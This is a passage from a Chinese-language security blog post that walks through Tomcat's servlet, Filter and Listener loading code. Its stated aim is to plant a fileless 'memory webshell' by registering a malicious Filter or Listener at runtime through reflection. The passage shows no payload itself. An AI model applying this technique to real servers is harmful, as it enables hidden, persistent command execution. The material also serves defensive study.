                    <span class="n">maxFileSize</span> <span class="o">=</span> <span class="n">Long</span><span class="o">.</span><span class="na">parseLong</span><span class="o">(</span><span class="n">multipartdef</span><span class="o">.</span><span class="na">getMaxFileSize</span><span class="o">());</span>
                <span class="o">}</span>
                <span class="k">if</span><span class="o">(</span><span class="kc">null</span> <span class="o">!=</span> <span class="n">multipartdef</span><span class="o">.</span><span class="na">getMaxRequestSize</span><span class="o">())</span> <span class="o">{</span>
                    <span class="n">maxRequestSize</span> <span class="o">=</span> <span class="n">Long</span><span class="o">.</span><span class="na">parseLong</span><span class="o">(</span><span class="n">multipartdef</span><span class="o">.</span><span class="na">getMaxRequestSize</span><span class="o">());</span>
                <span class="o">}</span>
                <span class="k">if</span><span class="o">(</span><span class="kc">null</span> <span class="o">!=</span> <span class="n">multipartdef</span><span class="o">.</span><span class="na">getFileSizeThreshold</span><span class="o">())</span> <span class="o">{</span>
                    <span class="n">fileSizeThreshold</span> <span class="o">=</span> <span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">multipartdef</span><span class="o">.</span><span class="na">getFileSizeThreshold</span><span class="o">());</span>
                <span class="o">}</span>

                <span class="n">wrapper</span><span class="o">.</span><span class="na">setMultipartConfigElement</span><span class="o">(</span><span class="k">new</span> <span class="n">MultipartConfigElement</span><span class="o">(</span>
                        <span class="n">multipartdef</span><span class="o">.</span><span class="na">getLocation</span><span class="o">(),</span>
                        <span class="n">maxFileSize</span><span class="o">,</span>
                        <span class="n">maxRequestSize</span><span class="o">,</span>
                        <span class="n">fileSizeThreshold</span><span class="o">));</span>
            <span class="o">}</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">servlet</span><span class="o">.</span><span class="na">getAsyncSupported</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">wrapper</span><span class="o">.</span><span class="na">setAsyncSupported</span><span class="o">(</span>
                        <span class="n">servlet</span><span class="o">.</span><span class="na">getAsyncSupported</span><span class="o">().</span><span class="na">booleanValue</span><span class="o">());</span>
            <span class="o">}</span>
            <span class="n">wrapper</span><span class="o">.</span><span class="na">setOverridable</span><span class="o">(</span><span class="n">servlet</span><span class="o">.</span><span class="na">isOverridable</span><span class="o">());</span>
            <span class="n">context</span><span class="o">.</span><span class="na">addChild</span><span class="o">(</span><span class="n">wrapper</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="k">for</span> <span class="o">(</span><span class="n">Entry</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;</span> <span class="n">entry</span> <span class="o">:</span>
                <span class="n">webxml</span><span class="o">.</span><span class="na">getServletMappings</span><span class="o">().</span><span class="na">entrySet</span><span class="o">())</span> <span class="o">{</span>
            <span class="n">context</span><span class="o">.</span><span class="na">addServletMappingDecoded</span><span class="o">(</span><span class="n">entry</span><span class="o">.</span><span class="na">getKey</span><span class="o">(),</span> <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">());</span>
        <span class="o">}</span>
</pre></div>
<p>首先通过<code>webxml.getServlets()</code>获取的所有<code>Servlet</code>定义，并建立循环；然后创建一个<code>Wrapper</code>对象，并设置<code>Servlet</code>的加载顺序、是否启用（即获取<code>&lt;/load-on-startup&gt;</code>标签的值）、<code>Servlet</code>的名称等基本属性；接着遍历<code>Servlet</code>的初始化参数并设置到<code>Wrapper</code>中，并处理安全角色引用、将角色和对应链接添加到<code>Wrapper</code>中；如果<code>Servlet</code>定义中包含文件上传配置，则根据配置信息设置<code>MultipartConfigElement</code>；设置<code>Servlet</code>是否支持异步操作；通过<code>context.addChild(wrapper);</code>将配置好的<code>Wrapper</code>添加到<code>Context</code>中，完成<code>Servlet</code>的初始化过程。</p>
<p>上面大的<code>for</code>循环中嵌套的最后一个<code>for</code>循环则负责处理<code>Servlet</code>的<code>url</code>映射，将<code>Servlet</code>的<code>url</code>与<code>Servlet</code>名称关联起来。</p>
<p>也就是说，<code>Servlet</code>的初始化主要经历以下六个步骤：</p>
<ul>
<li>创建<code>Wapper</code>对象；</li>
<li>设置<code>Servlet</code>的<code>LoadOnStartUp</code>的值；</li>
<li>设置<code>Servlet</code>的名称；</li>
<li>设置<code>Servlet</code>的<code>class</code>；</li>
<li>将配置好的<code>Wrapper</code>添加到<code>Context</code>中；</li>
<li>将<code>url</code>和<code>servlet</code>类做映射</li>
</ul>
<h3 data-content="1" id="85db2eda27c7d86b1e696dc28c8d9a62">2.3.2 servlet装载流程分析</h3>
<p>我们在<code>org.apache.catalina.core.StandardWrapper#loadServlet</code>这里打下断点进行调试，重点关注<code>org.apache.catalina.core.StandardContext#startInternal</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001923-274b4816-c830-1.jpeg"/></p>
<p>可以看到，装载顺序为<code>Listener</code>--&gt;<code>Filter</code>--&gt;<code>Servlet</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001924-27e69028-c830-1.jpeg"/></p>
<p>可以看到，上面红框中的代码都调用了<code>org.apache.catalina.core.StandardContext#loadOnStartup</code>，<code>Ctrl+左键</code>跟进该方法，代码如下：</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">loadOnStartup</span><span class="o">(</span><span class="n">Container</span> <span class="n">children</span><span class="o">[])</span> <span class="o">{</span>
    <span class="n">TreeMap</span><span class="o">&lt;</span><span class="n">Integer</span><span class="o">,</span><span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">Wrapper</span><span class="o">&gt;&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TreeMap</span><span class="o">&lt;&gt;();</span>
    <span class="k">for</span> <span class="o">(</span><span class="n">Container</span> <span class="n">child</span> <span class="o">:</span> <span class="n">children</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">Wrapper</span> <span class="n">wrapper</span> <span class="o">=</span> <span class="o">(</span><span class="n">Wrapper</span><span class="o">)</span> <span class="n">child</span><span class="o">;</span>
        <span class="kt">int</span> <span class="n">loadOnStartup</span> <span class="o">=</span> <span class="n">wrapper</span><span class="o">.</span><span class="na">getLoadOnStartup</span><span class="o">();</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">loadOnStartup</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">continue</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="n">Integer</span> <span class="n">key</span> <span class="o">=</span> <span class="n">Integer</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">loadOnStartup</span><span class="o">);</span>
        <span class="n">map</span><span class="o">.</span><span class="na">computeIfAbsent</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">k</span> <span class="o">-&gt;</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;&gt;()).</span><span class="na">add</span><span class="o">(</span><span class="n">wrapper</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="k">for</span> <span class="o">(</span><span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">Wrapper</span><span class="o">&gt;</span> <span class="n">list</span> <span class="o">:</span> <span class="n">map</span><span class="o">.</span><span class="na">values</span><span class="o">())</span> <span class="o">{</span>
        <span class="k">for</span> <span class="o">(</span><span class="n">Wrapper</span> <span class="n">wrapper</span> <span class="o">:</span> <span class="n">list</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="n">wrapper</span><span class="o">.</span><span class="na">load</span><span class="o">();</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ServletException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">getLogger</span><span class="o">().</span><span class="na">error</span><span class="o">(</span>
                        <span class="n">sm</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="s">"standardContext.loadOnStartup.loadException"</span><span class="o">,</span> <span class="n">getName</span><span class="o">(),</span> <span class="n">wrapper</span><span class="o">.</span><span class="na">getName</span><span class="o">()),</span>
                        <span class="n">StandardWrapper</span><span class="o">.</span><span class="na">getRootCause</span><span class="o">(</span><span class="n">e</span><span class="o">));</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">getComputedFailCtxIfServletStartFails</span><span class="o">())</span> <span class="o">{</span>
                    <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>
    <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
<span class="o">}</span>
</pre></div>
<p>可以看到，这段代码先是创建一个<code>TreeMap</code>，然后遍历传入的<code>Container</code>数组，将每个<code>Servlet</code>的<code>loadOnStartup</code>值作为键，将对应的<code>Wrapper</code>对象存储在相应的列表中；如果这个<code>loadOnStartup</code>值是负数，除非你请求访问它，否则就不会加载；如果是非负数，那么就按照这个<code>loadOnStartup</code>的升序的顺序来加载。</p>
<h2 data-content="1" id="4272229e5bf462f8ff0b200ba6c7a817">2.4 Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain</h2>
<p>开头先明确一点，就是<code>Filter</code>容器是用于对请求和响应进行过滤和处理的，以下这张图是根据<code>Skay</code>师傅文章中的图片重制的：</p>
<blockquote>
<p><a href="https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g" target="_blank">https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g</a></p>
</blockquote>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001925-283172f0-c830-1.jpeg"/></p>
<p>从上图可以看出，这个<code>filter</code>就是一个关卡，客户端的请求在经过<code>filter</code>之后才会到<code>Servlet</code>，那么如果我们动态创建一个<code>filter</code>并且将其放在最前面，我们的<code>filter</code>就会最先执行，当我们在<code>filter</code>中添加恶意代码，就可以实现命令执行，形成内存马。</p>
<p>这些名词其实很容易理解，首先，需要定义过滤器<code>FilterDef</code>，存放这些<code>FilterDef</code>的数组被称为<code>FilterDefs</code>，每个<code>FilterDef</code>定义了一个具体的过滤器，包括描述信息、名称、过滤器实例以及<code>class</code>等，这一点可以从<code>org/apache/tomcat/util/descriptor/web/FilterDef.java</code>的代码中看出来；然后是<code>FilterDefs</code>，它只是过滤器的抽象定义，而<code>FilterConfigs</code>则是这些过滤器的具体配置实例，我们可以为每个过滤器定义具体的配置参数，以满足系统的需求；紧接着是<code>FilterMaps</code>，它是用于将<code>FilterConfigs</code>映射到具体的请求路径或其他标识上，这样系统在处理请求时就能够根据请求的路径或标识找到对应的<code>FilterConfigs</code>，从而确定要执行的过滤器链；而<code>FilterChain</code>是由多个<code>FilterConfigs</code>组成的链式结构，它定义了过滤器的执行顺序，在处理请求时系统会按照<code>FilterChain</code>中的顺序依次执行每个过滤器，对请求进行过滤和处理。</p>
<h2 data-content="1" id="081b673e92ba4be137163518ea6fb2ad">2.5 编写一个简单的Filter</h2>
<p>我们继续用我们之前在<code>2.2</code>中搭建的环境，添加<code>TestFilter.java</code>：</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">org.example</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.servlet.*</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.servlet.annotation.WebFilter</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>

<span class="nd">@WebFilter</span><span class="o">(</span><span class="s">"/test"</span><span class="o">)</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">TestFilter</span> <span class="kd">implements</span> <span class="n">Filter</span> <span class="o">{</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">init</span><span class="o">(</span><span class="n">FilterConfig</span> <span class="n">filterConfig</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"[*] Filter初始化创建"</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doFilter</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">servletRequest</span><span class="o">,</span> <span class="n">ServletResponse</span> <span class="n">servletResponse</span><span class="o">,</span> <span class="n">FilterChain</span> <span class="n">filterChain</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ServletException</span> <span class="o">{</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"[*] Filter执行过滤操作"</span><span class="o">);</span>
        <span class="n">filterChain</span><span class="o">.</span><span class="na">doFilter</span><span class="o">(</span><span class="n">servletRequest</span><span class="o">,</span> <span class="n">servletResponse</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">destroy</span><span class="o">()</span> <span class="o">{</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"[*] Filter已销毁"</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>跑起来之后，控制台输出<code>[*] Filter初始化创建</code>，当我们访问<code>/test</code>路由的时候，控制台继续输出<code>[*] Filter执行过滤操作</code>，当我们结束<code>tomcat</code>的时候，会触发<code>destroy</code>方法，从而输出<code>[*] Filter已销毁</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001926-28e8bdc0-c830-1.jpeg"/></p>
<h2 data-content="1" id="14cdc133b6066491729dd53b553e114f">2.6 从代码层面分析Filter运行的整体流程</h2>
<p>我们在上面的<code>demo</code>中的<code>doFilter</code>函数这里下断点进行调试：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001928-29eda730-c830-1.jpeg"/></p>
<p>跟进<code>org.apache.catalina.core.StandardWrapperValve#invoke</code>：</p>
<div class="highlight"><pre><span></span><span class="n">filterChain</span><span class="o">.</span><span class="na">doFilter</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getRequest</span><span class="o">(),</span> <span class="n">response</span><span class="o">.</span><span class="na">getResponse</span><span class="o">());</span>
</pre></div>
<p>继续跟进变量<code>filterChain</code>，找到定义处的代码：</p>
<div class="highlight"><pre><span></span><span class="n">ApplicationFilterChain</span> <span class="n">filterChain</span> <span class="o">=</span> <span class="n">ApplicationFilterFactory</span><span class="o">.</span><span class="na">createFilterChain</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">wrapper</span><span class="o">,</span> <span class="n">servlet</span><span class="o">);</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001929-2ac1162e-c830-1.jpeg"/></p>
<p>查看该方法（<code>org.apache.catalina.core.ApplicationFilterFactory#createFilterChain</code>）：</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="n">ApplicationFilterChain</span> <span class="nf">createFilterChain</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">Wrapper</span> <span class="n">wrapper</span><span class="o">,</span> <span class="n">Servlet</span> <span class="n">servlet</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">servlet</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
        <span class="n">ApplicationFilterChain</span> <span class="n">filterChain</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">request</span> <span class="k">instanceof</span> <span class="n">Request</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">Request</span> <span class="n">req</span> <span class="o">=</span> <span class="o">(</span><span class="n">Request</span><span class="o">)</span><span class="n">request</span><span class="o">;</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">Globals</span><span class="o">.</span><span class="na">IS_SECURITY_ENABLED</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">filterChain</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ApplicationFilterChain</span><span class="o">();</span>
            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                <span class="n">filterChain</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationFilterChain</span><span class="o">)</span><span class="n">req</span><span class="o">.</span><span class="na">getFilterChain</span><span class="o">();</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">filterChain</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">filterChain</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ApplicationFilterChain</span><span class="o">();</span>
                    <span class="n">req</span><span class="o">.</span><span class="na">setFilterChain</span><span class="o">(</span><span class="n">filterChain</span><span class="o">);</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="n">filterChain</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ApplicationFilterChain</span><span class="o">();</span>
        <span class="o">}</span>

        <span class="n">filterChain</span><span class="o">.</span><span class="na">setServlet</span><span class="o">(</span><span class="n">servlet</span><span class="o">);</span>
        <span class="n">filterChain</span><span class="o">.</span><span class="na">setServletSupportsAsync</span><span class="o">(</span><span class="n">wrapper</span><span class="o">.</span><span class="na">isAsyncSupported</span><span class="o">());</span>
        <span class="n">StandardContext</span> <span class="n">context</span> <span class="o">=</span> <span class="o">(</span><span class="n">StandardContext</span><span class="o">)</span><span class="n">wrapper</span><span class="o">.</span><span class="na">getParent</span><span class="o">();</span>
        <span class="n">FilterMap</span><span class="o">[]</span> <span class="n">filterMaps</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="na">findFilterMaps</span><span class="o">();</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">filterMaps</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">filterMaps</span><span class="o">.</span><span class="na">length</span> <span class="o">!=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">DispatcherType</span> <span class="n">dispatcher</span> <span class="o">=</span> <span class="o">(</span><span class="n">DispatcherType</span><span class="o">)</span><span class="n">request</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"org.apache.catalina.core.DISPATCHER_TYPE"</span><span class="o">);</span>
            <span class="n">String</span> <span class="n">requestPath</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
            <span class="n">Object</span> <span class="n">attribute</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"org.apache.catalina.core.DISPATCHER_REQUEST_PATH"</span><span class="o">);</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">attribute</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">requestPath</span> <span class="o">=</span> <span class="n">attribute</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
            <span class="o">}</span>

            <span class="n">String</span> <span class="n">servletName</span> <span class="o">=</span> <span class="n">wrapper</span><span class="o">.</span><span class="na">getName</span><span class="o">();</span>
            <span class="n">FilterMap</span><span class="o">[]</span> <span class="n">var10</span> <span class="o">=</span> <span class="n">filterMaps</span><span class="o">;</span>
            <span class="kt">int</span> <span class="n">var11</span> <span class="o">=</span> <span class="n">filterMaps</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>

            <span class="kt">int</span> <span class="n">var12</span><span class="o">;</span>
            <span class="n">FilterMap</span> <span class="n">filterMap</span><span class="o">;</span>
            <span class="n">ApplicationFilterConfig</span> <span class="n">filterConfig</span><span class="o">;</span>
            <span class="k">for</span><span class="o">(</span><span class="n">var12</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">var12</span> <span class="o">&lt;</span> <span class="n">var11</span><span class="o">;</span> <span class="o">++</span><span class="n">var12</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">filterMap</span> <span class="o">=</span> <span class="n">var10</span><span class="o">[</span><span class="n">var12</span><span class="o">];</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">matchDispatcher</span><span class="o">(</span><span class="n">filterMap</span><span class="o">,</span> <span class="n">dispatcher</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">matchFiltersURL</span><span class="o">(</span><span class="n">filterMap</span><span class="o">,</span> <span class="n">requestPath</span><span class="o">))</span> <span class="o">{</span>
                    <span class="n">filterConfig</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationFilterConfig</span><span class="o">)</span><span class="n">context</span><span class="o">.</span><span class="na">findFilterConfig</span><span class="o">(</span><span class="n">filterMap</span><span class="o">.</span><span class="na">getFilterName</span><span class="o">());</span>
                    <span class="k">if</span> <span class="o">(</span><span class="n">filterConfig</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                        <span class="n">filterChain</span><span class="o">.</span><span class="na">addFilter</span><span class="o">(</span><span class="n">filterConfig</span><span class="o">);</span>
                    <span class="o">}</span>
                <span class="o">}</span>
            <span class="o">}</span>

            <span class="n">var10</span> <span class="o">=</span> <span class="n">filterMaps</span><span class="o">;</span>
            <span class="n">var11</span> <span class="o">=</span> <span class="n">filterMaps</span><span class="o">.</span><span class="na">length</span><span class="o">;</span>

            <span class="k">for</span><span class="o">(</span><span class="n">var12</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">var12</span> <span class="o">&lt;</span> <span class="n">var11</span><span class="o">;</span> <span class="o">++</span><span class="n">var12</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">filterMap</span> <span class="o">=</span> <span class="n">var10</span><span class="o">[</span><span class="n">var12</span><span class="o">];</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">matchDispatcher</span><span class="o">(</span><span class="n">filterMap</span><span class="o">,</span> <span class="n">dispatcher</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">matchFiltersServlet</span><span class="o">(</span><span class="n">filterMap</span><span class="o">,</span> <span class="n">servletName</span><span class="o">))</span> <span class="o">{</span>
                    <span class="n">filterConfig</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationFilterConfig</span><span class="o">)</span><span class="n">context</span><span class="o">.</span><span class="na">findFilterConfig</span><span class="o">(</span><span class="n">filterMap</span><span class="o">.</span><span class="na">getFilterName</span><span class="o">());</span>
                    <span class="k">if</span> <span class="o">(</span><span class="n">filterConfig</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                        <span class="n">filterChain</span><span class="o">.</span><span class="na">addFilter</span><span class="o">(</span><span class="n">filterConfig</span><span class="o">);</span>
                    <span class="o">}</span>
                <span class="o">}</span>
            <span class="o">}</span>

            <span class="k">return</span> <span class="n">filterChain</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="k">return</span> <span class="n">filterChain</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>我们在该方法和下面定义<code>filterMaps</code>那行下断点进行调试，可以看到，这段代码先是判断<code>servlet</code>是否为空，如果是就表示没有有效的<code>servlet</code>，无法创建过滤器链；然后根据传入的<code>ServletRequest</code>的类型来分类处理，如果是<code>Request</code>类型，并且启用了安全性，那么就创建一个新的<code>ApplicationFilterChain</code>，如果没启用，那么就尝试从请求中获取现有的过滤器链，如果不存在那么就创建一个新的；接着是设置过滤器链的<code>Servlet</code>和异步支持属性，这个没啥说的；关键点在于后面从<code>Wrapper</code>中获取父级上下文（<code>StandardContext</code>），然后获取该上下文中定义的过滤器映射数组（<code>FilterMap</code>）；最后遍历过滤器映射数组，根据请求的<code>DispatcherType</code>和请求路径匹配过滤器，并将匹配的过滤器添加到过滤器链中，最终返回创建或更新后的过滤器链。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001931-2bb4312e-c830-1.jpeg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001933-2cd947f6-c830-1.jpeg"/></p>
<p>从上面的两张图我们也可以清晰地看到<code>filterConfig</code>、<code>filterMap</code>、<code>FilterDef</code>的结构。</p>
<p>跟进刚才的<code>filterChain.doFilter</code>方法，位于<code>org.apache.catalina.core.ApplicationFilterChain#doFilter</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001934-2dab896e-c830-1.jpeg"/></p>
<p>可以看到都是调用了<code>org.apache.catalina.core.ApplicationFilterChain#internalDoFilter</code>方法，在这个方法中会依次拿到<code>filterConfig</code>和<code>filter</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001936-2e9c2be4-c830-1.jpeg"/></p>
<p>好了，大致过程到这里就结束了，但是我们的目的是打入内存马，也就是要动态地创建一个<code>Filter</code>，回顾之前的调试过程，我们发现在<code>createFilterChain</code>那个函数里面有两个关键点：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001937-2f88b4fa-c830-1.jpeg"/></p>
<p>也就是这里我用箭头指出来的<code>org.apache.catalina.core.StandardContext#findFilterMaps</code>和<code>org.apache.catalina.core.StandardContext#findFilterConfig</code>。</p>
<p>二者的实现代码粘贴如下：</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">FilterMap</span><span class="o">[]</span> <span class="nf">findFilterMaps</span><span class="o">()</span> <span class="o">{</span>
    <span class="k">return</span> <span class="n">filterMaps</span><span class="o">.</span><span class="na">asArray</span><span class="o">();</span>
<span class="o">}</span>

<span class="kd">public</span> <span class="n">FilterConfig</span> <span class="nf">findFilterConfig</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">)</span> <span class="o">{</span>
    <span class="kd">synchronized</span> <span class="o">(</span><span class="n">filterDefs</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">filterConfigs</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>也就是说我们只需要查找到现有的上下文，然后往里面插入我们自定义的恶意过滤器映射和过滤器配置，就可以实现动态添加过滤器了。</p>
<p>那也就是说，我们现在的问题就转化为如何添加<code>filterMap</code>和<code>filterConfig</code>。我们搜索关键词<code>addFilterMap</code>，即可看到在<code>StandardContext</code>中有两个相关的方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001939-305f9c9a-c830-1.jpeg"/></p>
<p>注释里面也说的很清楚，<code>addFilterMap</code>是在一组映射末尾添加新的我们自定义的新映射；而<code>addFilterMapBefore</code>则会自动把我们创建的<code>filterMap</code>丢到第一位去，无需再手动排序，这正是我们需要的呀！</p>
<p>可以看到，上面的<code>addFilterMapBefore</code>函数中第一步是先执行<code>org.apache.catalina.core.StandardContext#validateFilterMap</code>这个函数，点击去看看：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001940-314d4b2a-c830-1.jpeg"/></p>
<p>发现我们需要保证它在根据<code>filterName</code>找<code>filterDef</code>的时候，得能找到，也就是说，我们还得自定义<code>filterDef</code>并把它加入到<code>filterDefs</code>，不过这个也很简单，也有对应的方法，也就是<code>org.apache.catalina.core.StandardContext#addFilterDef</code>：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001941-321de050-c830-1.jpeg"/></p>
<p>搞定，继续去看<code>filterConfig</code>如何添加。经过搜索发现，不存在类似上面的<code>addFilterConfig</code>这种方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001943-32d629da-c830-1.jpeg"/></p>
<p>但是有<code>filterStart</code>和<code>filterStop</code>这两个方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001944-33adf37e-c830-1.jpeg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001945-3472db26-c830-1.jpeg"/></p>
<p>那也就是说，我们只能通过反射的方法去获取相关属性并添加进去。</p>
<h2 data-content="1" id="d8dcd0c1b7d4066d4c6d58ce0b9c323d">2.7 Listener简单介绍</h2>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240211001946-34c81f0a-c830-1.jpeg"/></p>
<p>由上图可知，<code>Listener</code>是最先被加载的，所以根据前面我们学到的思路，我动态注册一个恶意的<code>Listener</code>，就又可以形成一种内存马了。</p>
<p>在<code>tomcat</code>中，常见的<code>Listener</code>有以下几种：</p>
<ul>
<li>
<code>ServletContextListener</code>，用来监听整个<code>Web</code>应用程序的启动和关闭事件，需要实现<code>contextInitialized</code>和<code>contextDestroyed</code>这两个方法；</li>
<li>
<code>ServletRequestListener</code>，用来监听<code>HTTP</code>请求的创建和销毁事件，需要实现<code>requestInitialized</code>和<code>requestDestroyed</code>这两个方法；</li>
<li>
<code>HttpSessionListener</code>，用来监听<code>HTTP</code>会话的创建和销毁事件，需要实现<code>sessionCreated</code>和<code>sessionDestroyed</code>这两个方法；</li>
<li>
<code>HttpSessionAttributeListener</code>，监听<code>HTTP</code>会话属性的添加、删除和替换事件，需要实现<code>attributeAdded</code>、<code>attributeRemoved</code>和<code>attributeReplaced</code>这三个方法。</li>
</ul>
<p>很明显，<code>ServletRequestListener</code>是最适合做内存马的，因为它只要访问服务就能触发操作。</p>
<h2 data-content="1" id="67a5b7a08f46b9a14038303e754aaaed">2.8 编写一个简单的Listener（ServletRequestListener）</h2>
